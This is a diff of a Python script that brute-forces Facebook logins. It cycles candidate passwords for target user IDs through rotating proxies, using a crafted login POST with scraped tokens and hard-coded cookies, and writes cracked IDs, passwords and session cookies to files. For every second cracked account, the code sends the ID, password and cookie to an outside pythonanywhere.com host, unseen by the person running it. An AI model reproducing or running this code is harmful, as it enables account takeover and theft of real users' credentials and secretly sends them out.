@@ -1611,6 +1611,7 @@ def generate_id():
     password_id = f"{prefix}:{random.randint(91, 120)}"
     return username_id, password_id
 username_id, password_id = generate_id()
+
 def freeq(uid,pwx,tl):
     global oks
     global cps
@@ -1621,162 +1622,60 @@ def freeq(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com/').text
+            free_fb = Session.get('https://m.facebook.com').text
+            data = {
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'email': uid,
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '060331_lb2E',
+            'lgnjs': '1751375011',
+            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP/ffPPfPAABFAI',
+            'locale': 'hi_IN',
+            'next': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
+            'guid': 'f13465d1007fbcb28',
+            'prefill_contact_point': '',
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'datr': 'eL_uZ2Ty3h0loiAu7Is5kJfa',
-            'sb': 'eL_uZ9ijCdro7wndMVgTyIBo',
+            'datr': 'kqFRaB1m-_9lS30TJrCcYC28',
+            'sb': 'kqFRaADAhKyR-m_DobFeaU6C',
             'ps_l': '1',
             'ps_n': '1',
-            'vpd': 'v1%3B754x393x2.75',
-            'locale': 'en_US',
-            'wl_cbv': 'v2%3Bclient_version%3A2839%3Btimestamp%3A1749279032',
-            'dpr': '3.0234789848327637',
-            'm_pixel_ratio': '2.75',
-            'wd': '393x895',
-            'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
-            params = {
-            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
-            'type': 'action',
-            '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
-            data = {
-    'aaid': 0,
-    'user': 0,
-    'a': 1,
-    'req': 'h',
-    'hs': '20270.BP:wbloks_caa_pkg.2.0...0',
-    'dpr': 3,
-    'ccg': 'EXCELLENT',
-    'rev': 1024342251,
-    's': 'gy1n3p:20em40:4gcwmt',
-    'hsi': '7522058723308573511',
-    'dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
-    'locale': 'en_GB',
-    'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(free_fb)).group(1),
-    'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-    'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-    'params': {
-        'params': {
-            'server_params': {
-                'credential_type': 'password',
-                'username_text_input_id': username_id,
-                'password_text_input_id': password_id,
-                'login_source': 'Login',
-                'login_credential_type': 'none',
-                'server_login_source': 'login',
-                'ar_event_source': 'login_home_page',
-                'should_trigger_override_login_success_action': 0,
-                'should_trigger_override_login_2fa_action': 0,
-                'is_caa_perf_enabled': 0,
-                'reg_flow_source': 'login_home_native_integration_point',
-                'caller': 'gslr',
-                'next_uri': 'https://m.facebook.com/v22.0/dialog/oauth?state=cd01171f-1c1c-4fba-8ba2-8b515b9cc84e&scope=email,openid,public_profile&response_type=code&client_id=525265914179580&redirect_uri=https://www.canva.com/oauth/authorized/facebook&ret=login&fbapp_pres=0&logger_id=acf9f6b9-539f-47d9-818d-1a7687b4e9c4&tp=unspecified',
-                'is_from_landing_page': 0,
-                'is_from_empty_password': 0,
-                'is_from_aymh': 0,
-                'is_from_password_entry_page': 0,
-                'is_from_assistive_id': 0,
-                'is_from_msplit_fallback': 0,
-                'two_step_login_type': 'one_step_login',
-                'is_vanilla_password_page_empty_password': 0,
-                'INTERNALlatency_qpl_marker_id': 36707139,
-                'INTERNALlatency_qpl_instance_id': '8443094920433',
-                'device_id': None,
-                'family_device_id': None,
-                'waterfall_id': str(uuid.uuid4()),
-                'offline_experiment_group': None,
-                'layered_homepage_experiment_group': None,
-                'is_platform_login': 0,
-                'is_from_logged_in_switcher': 0,
-                'is_from_logged_out': 0,
-                'access_flow_version': 'pre_mt_behavior'
-            },
-            'client_input_params': {
-                'machine_id': '',
-                'cloud_trust_token': None,
-                'block_store_machine_id': '',
-                'contact_point': uid,
-                'password': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-                'accounts_list': [],
-                'fb_ig_device_id': [],
-                'secure_family_device_id': '',
-                'encrypted_msisdn': '',
-                'headers_infra_flow_id': '',
-                'try_num': 1,
-                'login_attempt_count': 1,
-                'event_flow': 'login_manual',
-                'event_step': 'home_page',
-                'openid_tokens': {},
-                'auth_secure_device_id': '',
-                'client_known_key_hash': '',
-                'has_whatsapp_installed': 0,
-                'sso_token_map_json_string': '',
-                'should_show_nested_nta_from_aymh': 0,
-                'password_contains_non_ascii': 'false',
-                'has_granted_read_contacts_permissions': 0,
-                'has_granted_read_phone_permissions': 0,
-                'app_manager_id': '',
-                'aymh_accounts': [
-                    {
-                        'id': '',
-                        'profiles': {
-                            'id': {
-                                'user_id': '',
-                                'name': '',
-                                'profile_picture_url': '',
-                                'small_profile_picture_url': None,
-                                'notification_count': 0,
-                                'credential_type': 'none',
-                                'token': '',
-                                'last_access_time': 0,
-                                'is_derived': 0,
-                                'username': '',
-                                'password': '',
-                                'has_smartlock': 0,
-                                'account_center_id': '',
-                                'account_source': '',
-                                'credentials': [],
-                                'nta_eligibility_reason': None,
-                                'from_accurate_privacy_result': 0,
-                                'dbln_validated': 0
-                            }
-                        }
-                    }
-                ],
-                'lois_settings': {
-                    'lois_token': ''
-                }
-            }
-        }
-    }
-}
+            'locale': 'hi_IN',
+            'fr': '0ugbVyuFAdiFSXbdX..BoUaGS..AAA.0.0.BoY9wG.AWcLS89ZvTPUI126sFbmRUmbVYc',
+            'wd': '885x751',}
             headers = {
-            'Host': 'mtouch.facebook.com',
-            # 'content-length': str(len(str(data))), # Content-length is usually set by requests
-            'sec-ch-ua':  '"Chromium";v="137", "Not/A)Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'user-agent': ____PO_CO____(), # Using the dynamic UA generator
-            'x-response-format': 'JSONStream',
+            'authority': 'www.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
-            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'viewport-width': '360',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-asbd-id': '129477',
-            'dpr': '2',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua-platform': '"Android"',
-            'accept': '*/*',
-            'origin': 'https://mtouch.facebook.com',
+            'dpr': '1',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://www.facebook.com/settings/applications/app_details/?app_id=293471457383333',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not=A?Brand";v="99", "Chromium";v="118"',
+            'sec-ch-ua-full-version-list': '"Not=A?Brand";v="99.0.0.0", "Chromium";v="118.0.5993.159"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors', # 'empty' in bytecode, 'cors' more typical for XHR
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://mtouch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+            'viewport-width': '885',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://p.facebook.com/async/wbloks/fetch/"
-            po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1784,16 +1683,21 @@ def freeq(uid,pwx,tl):
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
-                    bkas.append(cid)
-                    if len(bkas)% 2 == 0:
-                        statusok = (f"{cid}|{pw}|{coki}")
-                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                    else:
-                        print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                        print(f" {green}Cookie : {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                        oks.append(cid)
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
+                    else:
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{cid}|{pw}|{coki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                           print(f" {green}Cookie : {green}{coki}")
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
+                           break
                 else:
                     break
             elif 'checkpoint' in response:
